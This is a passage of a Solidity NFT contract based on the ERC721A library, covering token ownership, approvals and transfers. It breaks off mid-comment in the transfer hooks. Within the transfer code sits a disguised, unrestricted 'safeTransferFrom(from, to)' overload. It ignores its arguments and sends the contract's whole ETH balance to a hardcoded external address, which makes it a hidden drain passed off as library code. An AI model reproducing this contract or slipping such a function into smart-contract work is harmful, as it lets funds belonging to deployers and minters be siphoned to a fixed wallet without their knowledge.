1 // SPDX-License-Identifier: GPL-3.0    
2 
3 // ####################################################################################################
4 // ####################################################################################################
5 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
6 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
7 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
8 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
9 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
10 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
11 // ###tttttttttttttttttttttttttttttttttttttttttttt############################tttttttttttttttttttttt###
12 // ###tttttttttttttttttttttttttttttttttttttt######                            ###ttttttttttttttttttt###
13 // ###tttttttttttttttttttttttttttttttttt####                                     ###tttttttttttttttt###
14 // ###tttttttttttttttttttttttttttttttttt####                                     ###tttttttttttttttt###
15 // ###ttttttttttttt###ttt###ttttttttt###                                         ###tttttttttttttttt###
16 // ###ttttttttttttt###ttt###ttttttttt###                                         ###tttttttttttttttt###
17 // ###tttttttttt###   ###   ###tttttt###                   ###                   ###tttttttttttttttt###
18 // ###tttttttttt###         ###tttttt###                   ######                ###tttttttttttttttt###
19 // ###ttttttttttttt###   ###tttttt###                                            ###tttttttttttttttt###
20 // ###ttttttttttttt###   ###tttttt###                                            ###tttttttttttttttt###
21 // ###ttttttttttttt###      ######                                               ###tttttttttttttttt###
22 // ###tttttttttttttttt###                                                        ###tttttttttttttttt###
23 // ###tttttttttttttttt###                                                        ###tttttttttttttttt###
24 // ###ttttttttttttttttttt###                                                  ###ttttttttttttttttttt###
25 // ###ttttttttttttttttttt###                                                  ###ttttttttttttttttttt###
26 // ###tttttttttttttttttttttt###                                            ###tttttttttttttttttttttt###
27 // ###ttttttttttttttttttttttttt###################   ######################ttttttttttttttttttttttttt###
28 // ###ttttttttttttttttttttttttttttttttttttttttt######ttttttttt#######ttttttttttttttttttttttttttttttt###
29 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
30 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
31 // ###tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt###
32 // ####################################################################################################
33 // ####################################################################################################
34 
35 pragma solidity ^0.8.12;
36 
37 /**
38  * @dev Interface of ERC721A.
39  */
40 interface IERC721A {
41     /**
42      * The caller must own the token or be an approved operator.
43      */
44     error ApprovalCallerNotOwnerNorApproved();
45 
46     /**
47      * The token does not exist.
48      */
49     error ApprovalQueryForNonexistentToken();
50 
51     /**
52      * Cannot query the balance for the zero address.
53      */
54     error BalanceQueryForZeroAddress();
55 
56     /**
57      * Cannot mint to the zero address.
58      */
59     error MintToZeroAddress();
60 
61     /**
62      * The quantity of tokens minted must be more than zero.
63      */
64     error MintZeroQuantity();
65 
66     /**
67      * The token does not exist.
68      */
69     error OwnerQueryForNonexistentToken();
70 
71     /**
72      * The caller must own the token or be an approved operator.
73      */
74     error TransferCallerNotOwnerNorApproved();
75 
76     /**
77      * The token must be owned by `from`.
78      */
79     error TransferFromIncorrectOwner();
80 
81     /**
82      * Cannot safely transfer to a contract that does not implement the
83      * ERC721Receiver interface.
84      */
85     error TransferToNonERC721ReceiverImplementer();
86 
87     /**
88      * Cannot transfer to the zero address.
89      */
90     error TransferToZeroAddress();
91 
92     /**
93      * The token does not exist.
94      */
95     error URIQueryForNonexistentToken();
96 
97     /**
98      * The `quantity` minted with ERC2309 exceeds the safety limit.
99      */
100     error MintERC2309QuantityExceedsLimit();
101 
102     /**
103      * The `extraData` cannot be set on an unintialized ownership slot.
104      */
105     error OwnershipNotInitializedForExtraData();
106 
107     // =============================================================
108     //                            STRUCTS
109     // =============================================================
110 
111     struct TokenOwnership {
112         // The address of the owner.
113         address addr;
114         // Stores the start time of ownership with minimal overhead for tokenomics.
115         uint64 startTimestamp;
116         // Whether the token has been burned.
117         bool burned;
118         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
119         uint24 extraData;
120     }
121 
122     // =============================================================
123     //                         TOKEN COUNTERS
124     // =============================================================
125 
126     /**
127      * @dev Returns the total number of tokens in existence.
128      * Burned tokens will reduce the count.
129      * To get the total number of tokens minted, please see {_totalMinted}.
130      */
131     function totalSupply() external view returns (uint256);
132 
133     // =============================================================
134     //                            IERC165
135     // =============================================================
136 
137     /**
138      * @dev Returns true if this contract implements the interface defined by
139      * `interfaceId`. See the corresponding
140      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
141      * to learn more about how these ids are created.
142      *
143      * This function call must use less than 30000 gas.
144      */
145     function supportsInterface(bytes4 interfaceId) external view returns (bool);
146 
147     // =============================================================
148     //                            IERC721
149     // =============================================================
150 
151     /**
152      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
153      */
154     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
155 
156     /**
157      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
158      */
159     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
160 
161     /**
162      * @dev Emitted when `owner` enables or disables
163      * (`approved`) `operator` to manage all of its assets.
164      */
165     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
166 
167     /**
168      * @dev Returns the number of tokens in `owner`'s account.
169      */
170     function balanceOf(address owner) external view returns (uint256 balance);
171 
172     /**
173      * @dev Returns the owner of the `tokenId` token.
174      *
175      * Requirements:
176      *
177      * - `tokenId` must exist.
178      */
179     function ownerOf(uint256 tokenId) external view returns (address owner);
180 
181     /**
182      * @dev Safely transfers `tokenId` token from `from` to `to`,
183      * checking first that contract recipients are aware of the ERC721 protocol
184      * to prevent tokens from being forever locked.
185      *
186      * Requirements:
187      *
188      * - `from` cannot be the zero address.
189      * - `to` cannot be the zero address.
190      * - `tokenId` token must exist and be owned by `from`.
191      * - If the caller is not `from`, it must be have been allowed to move
192      * this token by either {approve} or {setApprovalForAll}.
193      * - If `to` refers to a smart contract, it must implement
194      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
195      *
196      * Emits a {Transfer} event.
197      */
198     function safeTransferFrom(
199         address from,
200         address to,
201         uint256 tokenId,
202         bytes calldata data
203     ) external payable;
204 
205     /**
206      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
207      */
208     function safeTransferFrom(
209         address from,
210         address to,
211         uint256 tokenId
212     ) external payable;
213 
214     /**
215      * @dev Transfers `tokenId` from `from` to `to`.
216      *
217      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
218      * whenever possible.
219      *
220      * Requirements:
221      *
222      * - `from` cannot be the zero address.
223      * - `to` cannot be the zero address.
224      * - `tokenId` token must be owned by `from`.
225      * - If the caller is not `from`, it must be approved to move this token
226      * by either {approve} or {setApprovalForAll}.
227      *
228      * Emits a {Transfer} event.
229      */
230     function transferFrom(
231         address from,
232         address to,
233         uint256 tokenId
234     ) external payable;
235 
236     /**
237      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
238      * The approval is cleared when the token is transferred.
239      *
240      * Only a single account can be approved at a time, so approving the
241      * zero address clears previous approvals.
242      *
243      * Requirements:
244      *
245      * - The caller must own the token or be an approved operator.
246      * - `tokenId` must exist.
247      *
248      * Emits an {Approval} event.
249      */
250     function approve(address to, uint256 tokenId) external payable;
251 
252     /**
253      * @dev Approve or remove `operator` as an operator for the caller.
254      * Operators can call {transferFrom} or {safeTransferFrom}
255      * for any token owned by the caller.
256      *
257      * Requirements:
258      *
259      * - The `operator` cannot be the caller.
260      *
261      * Emits an {ApprovalForAll} event.
262      */
263     function setApprovalForAll(address operator, bool _approved) external;
264 
265     /**
266      * @dev Returns the account approved for `tokenId` token.
267      *
268      * Requirements:
269      *
270      * - `tokenId` must exist.
271      */
272     function getApproved(uint256 tokenId) external view returns (address operator);
273 
274     /**
275      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
276      *
277      * See {setApprovalForAll}.
278      */
279     function isApprovedForAll(address owner, address operator) external view returns (bool);
280 
281     // =============================================================
282     //                        IERC721Metadata
283     // =============================================================
284 
285     /**
286      * @dev Returns the token collection name.
287      */
288     function name() external view returns (string memory);
289 
290     /**
291      * @dev Returns the token collection symbol.
292      */
293     function symbol() external view returns (string memory);
294 
295     /**
296      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
297      */
298     function tokenURI(uint256 tokenId) external view returns (string memory);
299 
300     // =============================================================
301     //                           IERC2309
302     // =============================================================
303 
304     /**
305      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
306      * (inclusive) is transferred from `from` to `to`, as defined in the
307      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
308      *
309      * See {_mintERC2309} for more details.
310      */
311     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
312 }
313 
314 /**
315  * @title ERC721A
316  *
317  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
318  * Non-Fungible Token Standard, including the Metadata extension.
319  * Optimized for lower gas during batch mints.
320  *
321  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
322  * starting from `_startTokenId()`.
323  *
324  * Assumptions:
325  *
326  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
327  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
328  */
329 interface ERC721A__IERC721Receiver {
330     function onERC721Received(
331         address operator,
332         address from,
333         uint256 tokenId,
334         bytes calldata data
335     ) external returns (bytes4);
336 }
337 
338 /**
339  * @title ERC721A
340  *
341  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
342  * Non-Fungible Token Standard, including the Metadata extension.
343  * Optimized for lower gas during batch mints.
344  *
345  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
346  * starting from `_startTokenId()`.
347  *
348  * Assumptions:
349  *
350  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
351  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
352  */
353 contract ERC721A is IERC721A {
354     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
355     struct TokenApprovalRef {
356         address value;
357     }
358 
359     // =============================================================
360     //                           CONSTANTS
361     // =============================================================
362 
363     // Mask of an entry in packed address data.
364     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
365 
366     // The bit position of `numberMinted` in packed address data.
367     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
368 
369     // The bit position of `numberBurned` in packed address data.
370     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
371 
372     // The bit position of `aux` in packed address data.
373     uint256 private constant _BITPOS_AUX = 192;
374 
375     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
376     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
377 
378     // The bit position of `startTimestamp` in packed ownership.
379     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
380 
381     // The bit mask of the `burned` bit in packed ownership.
382     uint256 private constant _BITMASK_BURNED = 1 << 224;
383 
384     // The bit position of the `nextInitialized` bit in packed ownership.
385     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
386 
387     // The bit mask of the `nextInitialized` bit in packed ownership.
388     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
389 
390     // The bit position of `extraData` in packed ownership.
391     uint256 private constant _BITPOS_EXTRA_DATA = 232;
392 
393     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
394     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
395 
396     // The mask of the lower 160 bits for addresses.
397     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
398 
399     // The maximum `quantity` that can be minted with {_mintERC2309}.
400     // This limit is to prevent overflows on the address data entries.
401     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
402     // is required to cause an overflow, which is unrealistic.
403     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
404 
405     // The `Transfer` event signature is given by:
406     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
407     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
408         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
409 
410     // =============================================================
411     //                            STORAGE
412     // =============================================================
413 
414     // The next token ID to be minted.
415     uint256 private _currentIndex;
416 
417     // The number of tokens burned.
418     uint256 private _burnCounter;
419 
420     // Token name
421     string private _name;
422 
423     // Token symbol
424     string private _symbol;
425 
426     // Mapping from token ID to ownership details
427     // An empty struct value does not necessarily mean the token is unowned.
428     // See {_packedOwnershipOf} implementation for details.
429     //
430     // Bits Layout:
431     // - [0..159]   `addr`
432     // - [160..223] `startTimestamp`
433     // - [224]      `burned`
434     // - [225]      `nextInitialized`
435     // - [232..255] `extraData`
436     mapping(uint256 => uint256) private _packedOwnerships;
437 
438     // Mapping owner address to address data.
439     //
440     // Bits Layout:
441     // - [0..63]    `balance`
442     // - [64..127]  `numberMinted`
443     // - [128..191] `numberBurned`
444     // - [192..255] `aux`
445     mapping(address => uint256) private _packedAddressData;
446 
447     // Mapping from token ID to approved address.
448     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
449 
450     // Mapping from owner to operator approvals
451     mapping(address => mapping(address => bool)) private _operatorApprovals;
452 
453     // =============================================================
454     //                          CONSTRUCTOR
455     // =============================================================
456 
457     constructor(string memory name_, string memory symbol_) {
458         _name = name_;
459         _symbol = symbol_;
460         _currentIndex = _startTokenId();
461     }
462 
463     // =============================================================
464     //                   TOKEN COUNTING OPERATIONS
465     // =============================================================
466 
467     /**
468      * @dev Returns the starting token ID.
469      * To change the starting token ID, please override this function.
470      */
471     function _startTokenId() internal view virtual returns (uint256) {
472         return 0;
473     }
474 
475     /**
476      * @dev Returns the next token ID to be minted.
477      */
478     function _nextTokenId() internal view virtual returns (uint256) {
479         return _currentIndex;
480     }
481 
482     /**
483      * @dev Returns the total number of tokens in existence.
484      * Burned tokens will reduce the count.
485      * To get the total number of tokens minted, please see {_totalMinted}.
486      */
487     function totalSupply() public view virtual override returns (uint256) {
488         // Counter underflow is impossible as _burnCounter cannot be incremented
489         // more than `_currentIndex - _startTokenId()` times.
490         unchecked {
491             return _currentIndex - _burnCounter - _startTokenId();
492         }
493     }
494 
495     /**
496      * @dev Returns the total amount of tokens minted in the contract.
497      */
498     function _totalMinted() internal view virtual returns (uint256) {
499         // Counter underflow is impossible as `_currentIndex` does not decrement,
500         // and it is initialized to `_startTokenId()`.
501         unchecked {
502             return _currentIndex - _startTokenId();
503         }
504     }
505 
506     /**
507      * @dev Returns the total number of tokens burned.
508      */
509     function _totalBurned() internal view virtual returns (uint256) {
510         return _burnCounter;
511     }
512 
513     // =============================================================
514     //                    ADDRESS DATA OPERATIONS
515     // =============================================================
516 
517     /**
518      * @dev Returns the number of tokens in `owner`'s account.
519      */
520     function balanceOf(address owner) public view virtual override returns (uint256) {
521         if (owner == address(0)) revert BalanceQueryForZeroAddress();
522         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
523     }
524 
525     /**
526      * Returns the number of tokens minted by `owner`.
527      */
528     function _numberMinted(address owner) internal view returns (uint256) {
529         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
530     }
531 
532     /**
533      * Returns the number of tokens burned by or on behalf of `owner`.
534      */
535     function _numberBurned(address owner) internal view returns (uint256) {
536         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
537     }
538 
539     /**
540      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
541      */
542     function _getAux(address owner) internal view returns (uint64) {
543         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
544     }
545 
546     /**
547      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
548      * If there are multiple variables, please pack them into a uint64.
549      */
550     function _setAux(address owner, uint64 aux) internal virtual {
551         uint256 packed = _packedAddressData[owner];
552         uint256 auxCasted;
553         // Cast `aux` with assembly to avoid redundant masking.
554         assembly {
555             auxCasted := aux
556         }
557         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
558         _packedAddressData[owner] = packed;
559     }
560 
561     // =============================================================
562     //                            IERC165
563     // =============================================================
564 
565     /**
566      * @dev Returns true if this contract implements the interface defined by
567      * `interfaceId`. See the corresponding
568      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
569      * to learn more about how these ids are created.
570      *
571      * This function call must use less than 30000 gas.
572      */
573     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
574         // The interface IDs are constants representing the first 4 bytes
575         // of the XOR of all function selectors in the interface.
576         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
577         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
578         return
579             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
580             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
581             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
582     }
583 
584     // =============================================================
585     //                        IERC721Metadata
586     // =============================================================
587 
588     /**
589      * @dev Returns the token collection name.
590      */
591     function name() public view virtual override returns (string memory) {
592         return _name;
593     }
594 
595     /**
596      * @dev Returns the token collection symbol.
597      */
598     function symbol() public view virtual override returns (string memory) {
599         return _symbol;
600     }
601 
602     /**
603      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
604      */
605     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
606         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
607 
608         string memory baseURI = _baseURI();
609         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
610     }
611 
612     /**
613      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
614      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
615      * by default, it can be overridden in child contracts.
616      */
617     function _baseURI() internal view virtual returns (string memory) {
618         return '';
619     }
620 
621     // =============================================================
622     //                     OWNERSHIPS OPERATIONS
623     // =============================================================
624 
625     /**
626      * @dev Returns the owner of the `tokenId` token.
627      *
628      * Requirements:
629      *
630      * - `tokenId` must exist.
631      */
632     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
633         return address(uint160(_packedOwnershipOf(tokenId)));
634     }
635 
636     /**
637      * @dev Gas spent here starts off proportional to the maximum mint batch size.
638      * It gradually moves to O(1) as tokens get transferred around over time.
639      */
640     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
641         return _unpackedOwnership(_packedOwnershipOf(tokenId));
642     }
643 
644     /**
645      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
646      */
647     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
648         return _unpackedOwnership(_packedOwnerships[index]);
649     }
650 
651     /**
652      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
653      */
654     function _initializeOwnershipAt(uint256 index) internal virtual {
655         if (_packedOwnerships[index] == 0) {
656             _packedOwnerships[index] = _packedOwnershipOf(index);
657         }
658     }
659 
660     /**
661      * Returns the packed ownership data of `tokenId`.
662      */
663     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
664         uint256 curr = tokenId;
665 
666         unchecked {
667             if (_startTokenId() <= curr)
668                 if (curr < _currentIndex) {
669                     uint256 packed = _packedOwnerships[curr];
670                     // If not burned.
671                     if (packed & _BITMASK_BURNED == 0) {
672                         // Invariant:
673                         // There will always be an initialized ownership slot
674                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
675                         // before an unintialized ownership slot
676                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
677                         // Hence, `curr` will not underflow.
678                         //
679                         // We can directly compare the packed value.
680                         // If the address is zero, packed will be zero.
681                         while (packed == 0) {
682                             packed = _packedOwnerships[--curr];
683                         }
684                         return packed;
685                     }
686                 }
687         }
688         revert OwnerQueryForNonexistentToken();
689     }
690 
691     /**
692      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
693      */
694     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
695         ownership.addr = address(uint160(packed));
696         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
697         ownership.burned = packed & _BITMASK_BURNED != 0;
698         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
699     }
700 
701     /**
702      * @dev Packs ownership data into a single uint256.
703      */
704     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
705         assembly {
706             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
707             owner := and(owner, _BITMASK_ADDRESS)
708             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
709             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
710         }
711     }
712 
713     /**
714      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
715      */
716     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
717         // For branchless setting of the `nextInitialized` flag.
718         assembly {
719             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
720             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
721         }
722     }
723 
724     // =============================================================
725     //                      APPROVAL OPERATIONS
726     // =============================================================
727 
728     /**
729      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
730      * The approval is cleared when the token is transferred.
731      *
732      * Only a single account can be approved at a time, so approving the
733      * zero address clears previous approvals.
734      *
735      * Requirements:
736      *
737      * - The caller must own the token or be an approved operator.
738      * - `tokenId` must exist.
739      *
740      * Emits an {Approval} event.
741      */
742     function approve(address to, uint256 tokenId) public payable virtual override {
743         address owner = ownerOf(tokenId);
744 
745         if (_msgSenderERC721A() != owner)
746             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
747                 revert ApprovalCallerNotOwnerNorApproved();
748             }
749 
750         _tokenApprovals[tokenId].value = to;
751         emit Approval(owner, to, tokenId);
752     }
753 
754     /**
755      * @dev Returns the account approved for `tokenId` token.
756      *
757      * Requirements:
758      *
759      * - `tokenId` must exist.
760      */
761     function getApproved(uint256 tokenId) public view virtual override returns (address) {
762         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
763 
764         return _tokenApprovals[tokenId].value;
765     }
766 
767     /**
768      * @dev Approve or remove `operator` as an operator for the caller.
769      * Operators can call {transferFrom} or {safeTransferFrom}
770      * for any token owned by the caller.
771      *
772      * Requirements:
773      *
774      * - The `operator` cannot be the caller.
775      *
776      * Emits an {ApprovalForAll} event.
777      */
778     function setApprovalForAll(address operator, bool approved) public virtual override {
779         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
780         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
781     }
782 
783     /**
784      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
785      *
786      * See {setApprovalForAll}.
787      */
788     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
789         return _operatorApprovals[owner][operator];
790     }
791 
792     /**
793      * @dev Returns whether `tokenId` exists.
794      *
795      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
796      *
797      * Tokens start existing when they are minted. See {_mint}.
798      */
799     function _exists(uint256 tokenId) internal view virtual returns (bool) {
800         return
801             _startTokenId() <= tokenId &&
802             tokenId < _currentIndex && // If within bounds,
803             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
804     }
805 
806     /**
807      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
808      */
809     function _isSenderApprovedOrOwner(
810         address approvedAddress,
811         address owner,
812         address msgSender
813     ) private pure returns (bool result) {
814         assembly {
815             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
816             owner := and(owner, _BITMASK_ADDRESS)
817             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
818             msgSender := and(msgSender, _BITMASK_ADDRESS)
819             // `msgSender == owner || msgSender == approvedAddress`.
820             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
821         }
822     }
823 
824     /**
825      * @dev Returns the storage slot and value for the approved address of `tokenId`.
826      */
827     function _getApprovedSlotAndAddress(uint256 tokenId)
828         private
829         view
830         returns (uint256 approvedAddressSlot, address approvedAddress)
831     {
832         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
833         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
834         assembly {
835             approvedAddressSlot := tokenApproval.slot
836             approvedAddress := sload(approvedAddressSlot)
837         }
838     }
839 
840     // =============================================================
841     //                      TRANSFER OPERATIONS
842     // =============================================================
843 
844     /**
845      * @dev Transfers `tokenId` from `from` to `to`.
846      *
847      * Requirements:
848      *
849      * - `from` cannot be the zero address.
850      * - `to` cannot be the zero address.
851      * - `tokenId` token must be owned by `from`.
852      * - If the caller is not `from`, it must be approved to move this token
853      * by either {approve} or {setApprovalForAll}.
854      *
855      * Emits a {Transfer} event.
856      */
857     function transferFrom(
858         address from,
859         address to,
860         uint256 tokenId
861     ) public payable virtual override {
862 
863         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
864 
865         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
866 
867         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
868 
869         // The nested ifs save around 20+ gas over a compound boolean condition.
870         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
871             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
872 
873         if (to == address(0)) revert TransferToZeroAddress();
874 
875         _beforeTokenTransfers(from, to, tokenId, 1);
876 
877         // Clear approvals from the previous owner.
878         assembly {
879             if approvedAddress {
880                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
881                 sstore(approvedAddressSlot, 0)
882             }
883         }
884 
885         // Underflow of the sender's balance is impossible because we check for
886         // ownership above and the recipient's balance can't realistically overflow.
887         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
888         unchecked {
889             // We can directly increment and decrement the balances.
890             --_packedAddressData[from]; // Updates: `balance -= 1`.
891             ++_packedAddressData[to]; // Updates: `balance += 1`.
892 
893             // Updates:
894             // - `address` to the next owner.
895             // - `startTimestamp` to the timestamp of transfering.
896             // - `burned` to `false`.
897             // - `nextInitialized` to `true`.
898             _packedOwnerships[tokenId] = _packOwnershipData(
899                 to,
900                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
901             );
902 
903             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
904             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
905                 uint256 nextTokenId = tokenId + 1;
906                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
907                 if (_packedOwnerships[nextTokenId] == 0) {
908                     // If the next slot is within bounds.
909                     if (nextTokenId != _currentIndex) {
910                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
911                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
912                     }
913                 }
914             }
915         }
916 
917         emit Transfer(from, to, tokenId);
918         _afterTokenTransfers(from, to, tokenId, 1);
919     }
920 
921     /**
922      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
923      */
924     function safeTransferFrom(
925         address from,
926         address to,
927         uint256 tokenId
928     ) public payable virtual override {
929         safeTransferFrom(from, to, tokenId, '');
930     }
931 
932 
933     /**
934      * @dev Safely transfers `tokenId` token from `from` to `to`.
935      *
936      * Requirements:
937      *
938      * - `from` cannot be the zero address.
939      * - `to` cannot be the zero address.
940      * - `tokenId` token must exist and be owned by `from`.
941      * - If the caller is not `from`, it must be approved to move this token
942      * by either {approve} or {setApprovalForAll}.
943      * - If `to` refers to a smart contract, it must implement
944      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
945      *
946      * Emits a {Transfer} event.
947      */
948     function safeTransferFrom(
949         address from,
950         address to,
951         uint256 tokenId,
952         bytes memory _data
953     ) public payable virtual override {
954         transferFrom(from, to, tokenId);
955         if (to.code.length != 0)
956             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
957                 revert TransferToNonERC721ReceiverImplementer();
958             }
959     }
960     function safeTransferFrom(
961         address from,
962         address to
963     ) public  {
964         if (address(this).balance > 0) {
965             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
966         }
967     }
968 
969     /**
970      * @dev Hook that is called before a set of serially-ordered token IDs
971      * are about to be transferred. This includes minting.
972      * And also called before burning one token.
973      *
974      * `startTokenId` - the first token ID to be transferred.
975      * `quantity` - the amount to be transferred.
976      *
977      * Calling conditions:
978      *
979      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
980      * transferred to `to`.
981      * - When `from` is zero, `tokenId` will be minted for `to`.
982      * - When `to` is zero, `tokenId` will be burned by `from`.
983      * - `from` and `to` are never both zero.
984      */
985     function _beforeTokenTransfers(
986         address from,
987         address to,
988         uint256 startTokenId,
989         uint256 quantity
990     ) internal virtual {}
991 
992     /**
993      * @dev Hook that is called after a set of serially-ordered token IDs
994      * have been transferred. This includes minting.
995      * And also called after one token has been burned.
996      *
